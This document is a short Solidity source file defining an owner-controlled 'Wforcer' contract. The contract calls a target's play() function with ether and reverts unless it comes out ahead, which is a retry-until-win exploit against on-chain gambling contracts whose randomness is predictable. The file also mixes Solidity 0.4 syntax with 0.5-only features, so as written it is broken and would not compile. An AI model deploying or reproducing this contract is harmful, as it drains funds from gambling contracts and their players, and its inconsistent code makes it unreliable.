pragma solidity ^0.4.11;
contract Owned {
  address owner;
  function Owned() {
    owner = msg.sender;
  }
  function kill() {
    if (msg.sender == owner) suicide(owner);
  }
}
contract Wforcer is Owned {
  function wcf(address payable target, uint256 a) external payable {
    require(msg.sender == owner);
    uint256 startBalance = address(this).balance;
    (bool success, ) = target.call.value(msg.value).gas(gasleft())(abi.encodeWithSignature("play(uint256)", a));
    require(success);
    require(address(this).balance > startBalance);
    owner.transfer(address(this).balance);
}
  function withdraw() {
    require(msg.sender == owner);
    require(this.balance > 0);
    owner.transfer(this.balance);
  }
  function () payable {}
}